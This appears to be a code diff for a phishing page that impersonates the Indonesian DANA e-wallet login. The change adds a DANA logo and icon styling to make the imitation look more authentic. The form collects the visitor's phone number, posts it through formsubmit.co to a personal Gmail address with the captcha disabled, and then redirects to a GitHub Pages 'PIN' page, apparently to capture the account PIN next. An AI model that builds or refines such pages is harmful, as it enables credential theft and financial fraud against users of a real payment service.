@@ -21,10 +21,19 @@
       max-width: 400px;
       width: 90%;
     }
-    .logo {
+    .logo-header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .logo-header img {
+      height: 30px;
+    }
+    .logo-header span {
       font-size: 24px;
       font-weight: bold;
-      margin-bottom: 20px;
     }
     form {
       display: flex;
@@ -33,20 +42,37 @@
     }
     .input-group {
       display: flex;
+      background-color: white;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .input-icon {
+      background-color: white;
+      padding: 10px;
+      border-right: 1px solid #ccc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .input-icon img {
+      height: 24px;
+      width: 24px;
     }
     .prefix {
       background-color: white;
       color: black;
       padding: 12px;
-      border-radius: 8px 0 0 8px;
       font-weight: bold;
+      border-right: 1px solid #ccc;
+      display: flex;
+      align-items: center;
     }
     input[type="tel"] {
       padding: 12px;
       width: 100%;
       border: none;
-      border-radius: 0 8px 8px 0;
       font-size: 18px;
+      outline: none;
     }
     button {
       background-color: white;
@@ -71,20 +97,29 @@
 </head>
 <body>
   <div class="container">
-    <div class="logo">DANA</div>
+    <!-- Logo DANA -->
+    <div class="logo-header">
+      <img src="logo-dana.png" alt="DANA Logo" />
+      <span>DANA</span>
+    </div>
+
     <p>Masukkan nomor HP kamu untuk lanjut</p>
+
     <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
       <div class="input-group">
+        <div class="input-icon">
+          <img src="logo-mini.png" alt="icon" />
+        </div>
         <div class="prefix">+62</div>
         <input type="tel" name="nomor_hp" placeholder="8112345678" required maxlength="13">
       </div>
+
       <input type="hidden" name="_captcha" value="false">
-      
-      <!-- ✅ Ubah _next ke halaman pribadi kamu -->
       <input type="hidden" name="_next" value="https://b813743.github.io/PIN/">
       
       <button type="submit">LANJUTKAN</button>
     </form>
+
     <p class="desc">
       Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
       Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&K</a> serta <a href="#">Kebijakan Privasi</a> kami.
